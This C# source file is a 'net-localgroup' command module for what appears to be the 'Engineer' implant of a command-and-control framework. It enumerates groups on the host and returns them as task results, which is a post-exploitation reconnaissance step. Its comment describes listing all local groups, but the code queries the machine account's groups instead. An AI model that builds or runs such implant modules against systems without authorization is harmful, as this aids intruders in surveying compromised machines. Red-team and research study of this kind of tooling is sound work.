using System;
using System.DirectoryServices.AccountManagement;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class net_localgroup : EngineerCommand
    {
        public override string Name => "net-localgroup";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                //get a list of all of the local groups on the current computer and return them one one entry per line
                var output = new StringBuilder();
                foreach (var group in GroupPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine), IdentityType.SamAccountName, Environment.MachineName + "$").GetGroups())
                {
                    output.AppendLine(group.Name);
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.ToString(),task,EngTaskStatus.Failed,TaskResponseType.String);
            }

        }
    }
}
